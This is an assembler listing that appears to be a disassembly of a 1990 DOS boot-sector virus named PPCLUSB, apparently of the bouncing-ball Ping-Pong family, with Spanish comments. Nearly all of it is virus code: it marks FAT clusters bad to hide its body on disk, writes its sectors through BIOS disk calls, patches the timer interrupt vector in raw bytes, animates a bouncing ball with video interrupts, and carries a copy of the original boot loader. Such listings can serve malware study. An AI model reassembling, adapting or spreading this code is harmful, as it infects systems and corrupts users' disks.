PAGE  60,132
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 PPCLUSB                      ;;
;;;                                      ;;
;;;      Created:   15-Mar-90                            ;;
;;;      Code type: zero start                           ;;
;;;      Passes:    5          Analysis Flags on: H              ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
data_1e     equ 51Ch            ; (0000:051C=3FF1h)
data_2e     equ 7C0Bh           ; (0000:7C0B=2002h)
data_3e     equ 7C15h           ; (0000:7C15=2)
data_4e     equ 7C18h           ; (0000:7C18=0EBC6h)
data_5e     equ 7C37h           ; (0000:7C37=1E0Ah)
data_6e     equ 7C3Bh           ; (0000:7C3B=0CDh)
data_7e     equ 7C3Ch           ; (0000:7C3C=2Ah)
data_8e     equ 7C3Dh           ; (0000:7C3D=0C636h)
data_9e     equ 7DFDh           ; (0000:7DFD=58h)
data_13e    equ 7C0Bh           ; (8F68:7C0B=0)
data_14e    equ 7C0Dh           ; (8F68:7C0D=0)
data_15e    equ 7C0Eh           ; (8F68:7C0E=0)
data_16e    equ 7C10h           ; (8F68:7C10=0)
data_17e    equ 7C11h           ; (8F68:7C11=0)
data_18e    equ 7C16h           ; (8F68:7C16=0)
data_19e    equ 7C18h           ; (8F68:7C18=0)
data_20e    equ 7C1Ah           ; (8F68:7C1A=0)
data_21e    equ 7C1Ch           ; (8F68:7C1C=0)
data_22e    equ 7C2Ah           ; (8F68:7C2A=0)
data_23e    equ 7C37h           ; (8F68:7C37=0)
data_24e    equ 7C39h           ; (8F68:7C39=0)
data_25e    equ 7C3Bh           ; (8F68:7C3B=0)
data_26e    equ 7C3Fh           ; (8F68:7C3F=0)
data_27e    equ 7DF3h           ; (8F68:7DF3=0)
data_28e    equ 7DF5h           ; (8F68:7DF5=0)
data_29e    equ 7DF7h           ; (8F68:7DF7=0)
data_30e    equ 7DF9h           ; (8F68:7DF9=0)
data_31e    equ 7DFDh           ; (8F68:7DFD=0)
data_32e    equ 7EB2h           ; (8F68:7EB2=0)
data_33e    equ 7FCDh           ; (8F68:7FCD=0)
data_34e    equ 7FCFh           ; (8F68:7FCF=0)
data_35e    equ 7FD1h           ; (8F68:7FD1=0)
data_36e    equ 7FD3h           ; (8F68:7FD3=0)
data_37e    equ 7FD6h           ; (8F68:7FD6=0)
data_38e    equ 8000h           ; (8F68:8000=0)
  
seg_a       segment
        assume  cs:seg_a, ds:seg_a
  
  
        org 0
  
ppclusb     proc    far
  
start:
        inc word ptr ds:data_27e    ; (8F68:7DF3=0)
        mov bx,ds:data_27e      ; (8F68:7DF3=0)
        add byte ptr ds:data_32e,2  ; (8F68:7EB2=0)
;*      call    sub_5           ;*(FE9D)
        db  0E8h, 8Dh, 0FEh
        jmp short loc_7     ; (004B)
loc_3:
        mov ax,3
        test    byte ptr ds:data_29e,4  ; (8F68:7DF7=0)
        jz  loc_4           ; Jump if zero
        inc ax
loc_4:
        mul si          ; dx:ax = reg * ax
        shr ax,1            ; Shift w/zeros fill
        sub ah,ds:data_32e      ; (8F68:7EB2=0)
        mov bx,ax
        cmp bx,1FFh
        jae start           ; Jump if above or =
        mov dx,ds:data_38e[bx]  ; (8F68:8000=0)
        test    byte ptr ds:data_29e,4  ; (8F68:7DF7=0)
        jnz loc_6           ; Jump if not zero
        mov cl,4
        test    si,1
        jz  loc_5           ; Jump if zero
        shr dx,cl           ; Shift w/zeros fill
loc_5:
        and dh,0Fh
loc_6:
        test    dx,0FFFFh
        jz  loc_8           ; Jump if zero
loc_7:
        inc si
        cmp si,di
        jbe loc_3           ; Jump if below or =
        retn
loc_8:
        mov dx,0FFF7h
        test    byte ptr ds:data_29e,4  ; (8F68:7DF7=0)
        jnz loc_9           ; Jump if not zero
        and dh,0Fh
        mov cl,4
        test    si,1
        jz  loc_9           ; Jump if zero
        shl dx,cl           ; Shift w/zeros fill
loc_9:
        or  ds:data_38e[bx],dx  ; (8F68:8000=0)
        mov bx,ds:data_27e      ; (8F68:7DF3=0)
;*      call    sub_4           ;*(FE98)
        db  0E8h, 25h, 0FEh
        mov ax,si
        sub ax,2
        mov bl,ds:data_14e      ; (8F68:7C0D=0)
        xor bh,bh           ; Zero register
        mul bx          ; dx:ax = reg * ax
        add ax,ds:data_28e      ; (8F68:7DF5=0)
        mov si,ax
        mov bx,0
;*      call    sub_5           ;*(FE9D)
        db  0E8h, 11h, 0FEh
        mov bx,si
        inc bx
;*      call    sub_4           ;*(FE98)
        db  0E8h, 6, 0FEh
        mov bx,si
        mov ds:data_30e,si      ; (8F68:7DF9=0)
        push    cs
        pop ax
        sub ax,20h
        mov es,ax
;*      call    sub_4           ;*(FE98)
        db  0E8h, 0F6h, 0FDh
        push    cs
        pop ax
        sub ax,40h
        mov es,ax
        mov bx,0
;*      call    sub_4           ;*(FE98)
        db  0E8h, 0E9h, 0FDh
        retn
        db  64h, 0B8h, 0, 0F6h, 6, 0F7h
        db  7Dh, 2, 75h, 24h, 80h, 0Eh
        db  0F7h, 7Dh, 2, 0B8h, 0, 0
        db  8Eh, 0D8h, 0A1h, 20h, 0, 8Bh
        db  1Eh, 22h, 0, 0C7h, 6, 20h
        db  0, 0DFh, 7Eh, 8Ch, 0Eh, 22h
        db  0, 0Eh, 1Fh, 0A3h, 0C9h, 7Fh
        db  89h, 1Eh, 0CBh, 7Fh, 0C3h, 1Eh
        db  50h, 53h, 51h, 52h, 0Eh, 1Fh
        db  0B4h, 0Fh, 0CDh, 10h, 8Ah, 0D8h
        db  3Bh, 1Eh, 0D4h, 7Fh, 74h, 35h
        db  89h, 1Eh, 0D4h, 7Fh, 0FEh, 0CCh
        db  88h, 26h, 0D6h, 7Fh, 0B4h, 1
        db  80h, 0FBh, 7, 75h, 2, 0FEh
        db  0CCh, 80h, 0FBh, 4, 73h, 2
        db  0FEh, 0CCh
loc_10:
        mov ds:data_36e,ah      ; (8F68:7FD3=0)
        mov word ptr ds:data_34e,101h   ; (8F68:7FCF=0)
        mov word ptr ds:data_35e,101h   ; (8F68:7FD1=0)
        mov ah,3
        int 10h         ; Video display   ah=functn 03h
                        ;  get cursor loc in dx, mode cx
        push    dx
        mov dx,ds:data_34e      ; (8F68:7FCF=0)
        jmp short loc_12        ; (014A)
        db  0B4h, 3, 0CDh, 10h, 52h, 0B4h
        db  2, 8Bh, 16h, 0CFh, 7Fh, 0CDh
        db  10h, 0A1h, 0CDh, 7Fh, 80h, 3Eh
        db  0D3h, 7Fh, 1, 75h, 3, 0B8h
        db  7, 83h
loc_11:
        mov bl,ah
        mov cx,1
        mov ah,9
        int 10h         ; Video display   ah=functn 09h
                        ;  set char al & attrib ah @curs
loc_12:
        mov cx,ds:data_35e      ; (8F68:7FD1=0)
        cmp dh,0
        jne loc_13          ; Jump if not equal
        xor ch,0FFh
        inc ch
loc_13:
        cmp dh,18h
        jne loc_14          ; Jump if not equal
        xor ch,0FFh
        inc ch
loc_14:
        cmp dl,0
        jne loc_15          ; Jump if not equal
        xor cl,0FFh
        inc cl
loc_15:
        cmp dl,ds:data_37e      ; (8F68:7FD6=0)
        jne loc_16          ; Jump if not equal
        xor cl,0FFh
        inc cl
loc_16:
        cmp cx,ds:data_35e      ; (8F68:7FD1=0)
        jne loc_18          ; Jump if not equal
        mov ax,ds:data_33e      ; (8F68:7FCD=0)
        and al,7
        cmp al,3
        jne loc_17          ; Jump if not equal
        xor ch,0FFh
        inc ch
loc_17:
        cmp al,5
        jne loc_18          ; Jump if not equal
        xor cl,0FFh
        inc cl
loc_18:
        add dl,cl
        add dh,ch
        mov ds:data_35e,cx      ; (8F68:7FD1=0)
        mov ds:data_34e,dx      ; (8F68:7FCF=0)
        mov ah,2
        int 10h         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        mov ah,8
        int 10h         ; Video display   ah=functn 08h
                        ;  get char al & attrib ah @curs
        mov ds:data_33e,ax      ; (8F68:7FCD=0)
        mov bl,ah
        cmp byte ptr ds:data_36e,1  ; (8F68:7FD3=0)
        jne loc_19          ; Jump if not equal
        mov bl,83h
loc_19:
        mov cx,1
        mov ax,907h
        int 10h         ; Video display   ah=functn 09h
                        ;  set char al & attrib ah @curs
                        ; el char que escribe es 07h,
                        ; -> la pelotita
        pop dx
        mov ah,2
        int 10h         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        pop dx
        pop cx
        pop bx
        pop ax
        pop ds
;*      jmp far ptr loc_1       ;*(0000:0020)
        db  0EAh, 20h, 0, 0, 0
        db  0, 0, 1, 1, 1, 1
        db  0, 0FFh, 0FFh, 50h, 0B7h, 0B7h
        db  0B7h, 0B6h, 40h, 40h, 88h, 0DEh
        db  0E6h, 5Ah, 0ACh, 0D2h, 0E4h, 0EAh
        db  0E6h, 40h, 50h, 0ECh
        db  '@d\`R@@@@db^b`^pn@A'
        db  0B7h, 0B7h, 0B7h, 0B6h, 0EBh, 34h
        db  90h
        db  'IBM  3.2'
        db  0, 2, 2, 1, 0, 2
        db  70h, 0, 0D0h, 2, 0FDh, 2
        db  0, 9, 0, 2, 0
        db  19 dup (0)
        db  0Fh, 0, 0, 0, 0, 1
        db  0, 0FAh, 33h, 0C0h, 8Eh, 0D0h
        db  0BCh, 0, 7Ch, 16h, 7, 0BBh
        db  78h, 0, 36h, 0C5h, 37h, 1Eh
        db  56h, 16h, 53h, 0BFh, 2Bh, 7Ch
        db  0B9h, 0Bh, 0, 0FCh
  
locloop_20:
        lodsb               ; String [si] to al
        cmp byte ptr es:[di],0
        je  loc_21          ; Jump if equal
        mov al,es:[di]
loc_21:
        stosb               ; Store al to es:[di]
        mov al,ah
        loop    locloop_20      ; Loop if cx > 0
  
        push    es
        pop ds
        mov [bx+2],ax
        mov word ptr [bx],7C2Bh
        sti             ; Enable interrupts
        int 13h         ; Disk  dl=drive a: ah=func 00h
                        ;  reset disk, al=return status
        jc  loc_24          ; Jump if carry Set
        mov al,ds:data_16e      ; (8F68:7C10=0)
        cbw             ; Convrt byte to word
        mul word ptr ds:data_18e    ; (8F68:7C16=0) ax = data * ax
        add ax,ds:data_21e      ; (8F68:7C1C=0)
        add ax,ds:data_15e      ; (8F68:7C0E=0)
        mov ds:data_26e,ax      ; (8F68:7C3F=0)
        mov ds:data_23e,ax      ; (8F68:7C37=0)
        mov ax,20h
        mul word ptr ds:data_17e    ; (8F68:7C11=0) ax = data * ax
        mov bx,ds:data_13e      ; (8F68:7C0B=0)
        add ax,bx
        dec ax
        div bx          ; ax,dx rem=dx:ax/reg
        add ds:data_23e,ax      ; (8F68:7C37=0)
        mov bx,500h
        mov ax,ds:data_26e      ; (8F68:7C3F=0)
        call    sub_2           ; (0337)
        mov ax,201h
        call    sub_3           ; (0351)
        jc  loc_22          ; Jump if carry Set
        mov di,bx
        mov cx,0Bh
        mov si,7DCFh
        repe    cmpsb           ; Rept zf=1+cx>0 Cmp [si] to es:[di]
        jnz loc_22          ; Jump if not zero
        lea di,[bx+20h]     ; Load effective addr
        mov si,7DDAh
        mov cx,0Bh
        repe    cmpsb           ; Rept zf=1+cx>0 Cmp [si] to es:[di]
        jz  loc_25          ; Jump if zero
loc_22:
        mov si,7D6Eh
loc_23:
        call    sub_1           ; (0329)
        xor ah,ah           ; Zero register
        int 16h         ; Keyboard i/o  ah=function 00h
                        ;  get keybd char in al, ah=scan
        pop si
        pop ds
        pop word ptr [si]
        pop word ptr [si+2]
        int 19h         ; Bootstrap loader
loc_24:
        mov si,7DB9h
        jmp short loc_23        ; (02C5)
loc_25:
        mov ax,ds:data_1e       ; (0000:051C=3FF1h)
        xor dx,dx           ; Zero register
        div word ptr ds:data_2e ; (0000:7C0B=2002h) ax,dxrem=dx:ax/dat
        inc al
        mov ds:data_7e,al       ; (0000:7C3C=2Ah)
        mov ax,ds:data_5e       ; (0000:7C37=1E0Ah)
        mov ds:data_8e,ax       ; (0000:7C3D=0C636h)
        mov bx,700h
loc_26:
        mov ax,ds:data_5e       ; (0000:7C37=1E0Ah)
        call    sub_2           ; (0337)
        mov ax,ds:data_4e       ; (0000:7C18=0EBC6h)
        sub al,ds:data_6e       ; (0000:7C3B=0CDh)
        inc ax
        push    ax
        call    sub_3           ; (0351)
        pop ax
        jc  loc_24          ; Jump if carry Set
        sub ds:data_7e,al       ; (0000:7C3C=2Ah)
        jbe loc_27          ; Jump if below or =
        add ds:data_5e,ax       ; (0000:7C37=1E0Ah)
        mul word ptr ds:data_2e ; (0000:7C0B=2002h) ax = data * ax
        add bx,ax
        jmp short loc_26        ; (02F1)
loc_27:
        mov ch,ds:data_3e       ; (0000:7C15=2)
        mov dl,ds:data_9e       ; (0000:7DFD=58h)
        mov bx,ds:data_8e       ; (0000:7C3D=0C636h)
;*      jmp far ptr loc_2       ;*(0070:0000)
        db  0EAh, 0, 0, 70h, 0
  
ppclusb     endp
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_1       proc    near
loc_28:
        lodsb               ; String [si] to al
        or  al,al           ; Zero ?
        jz  loc_ret_29      ; Jump if zero
        mov ah,0Eh
        mov bx,7
        int 10h         ; Video display   ah=functn 0Eh
                        ;  write char al, teletype mode
        jmp short loc_28        ; (0329)
  
;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_2:
        xor dx,dx           ; Zero register
        div word ptr ds:data_19e    ; (8F68:7C18=0) ax,dxrem=dx:ax/data
        inc dl
        mov ds:data_25e,dl      ; (8F68:7C3B=0)
        xor dx,dx           ; Zero register
        div word ptr ds:data_20e    ; (8F68:7C1A=0) ax,dxrem=dx:ax/data
        mov ds:data_22e,dl      ; (8F68:7C2A=0)
        mov ds:data_24e,ax      ; (8F68:7C39=0)
  
loc_ret_29:
        retn
sub_1       endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_3       proc    near
        mov ah,2
        mov dx,ds:data_24e      ; (8F68:7C39=0)
        mov cl,6
        shl dh,cl           ; Shift w/zeros fill
        or  dh,ds:data_25e      ; (8F68:7C3B=0)
        mov cx,dx
        xchg    ch,cl
        mov dl,ds:data_31e      ; (8F68:7DFD=0)
        mov dh,ds:data_22e      ; (8F68:7C2A=0)
        int 13h         ; Disk  dl=drive a: ah=func 02h
                        ;  read sectors to memory es:bx
        retn
sub_3       endp
  
        db  0Dh, 0Ah, 'Error en diskette o di'
        db  'skette sin DOS', 0Dh, 0Ah, 'C'
        db  0A0h
        db  'mbielo y pulse cualquier tecla', 0Dh
        db  0Ah
        db  0
        db  0Dh, 0Ah, 'Error en arranque', 0Dh
        db  0Ah
        db  0
        db  'IBMBIO  COMIBMDOS  COM'
        db  25 dup (0)
        db  55h, 0AAh
  
seg_a       ends
  
  
  
        end start
        